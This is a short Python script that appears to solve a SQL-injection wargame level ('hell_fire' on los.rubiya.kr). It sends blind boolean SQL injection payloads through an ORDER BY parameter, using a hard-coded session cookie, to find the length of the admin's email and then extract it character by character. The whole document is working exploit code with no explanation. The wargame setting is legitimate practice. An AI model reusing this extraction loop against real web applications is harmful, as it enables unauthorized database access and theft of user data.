from string import printable
import requests

session = requests.Session()
cookies = {"PHPSESSID": "7u0j9i54re004lunk8qhtjqkh9"}

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=(select case when (id='admin' and length(email)={}) then 1 else 3 end)--+"
for i in range(200):
    r = requests.get(url.format(i), cookies=cookies)
    print(i, end='\r')
    if('admin' in r.text[:76]):
        l = i
        break
print("Length :", l)
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=(select case when (id='admin' and ord(substr(email,{},1))={}) then 1 else 3 end)--+"
pw = ""
for j in range(1,l+1):
    for i in printable:
        r = requests.get(url.format(j,ord(i)), cookies=cookies)
        if('admin' in r.text[:76]):
            pw += i
            print("Password : {}".format(pw), end='\r')
            break
print("Password :", pw)
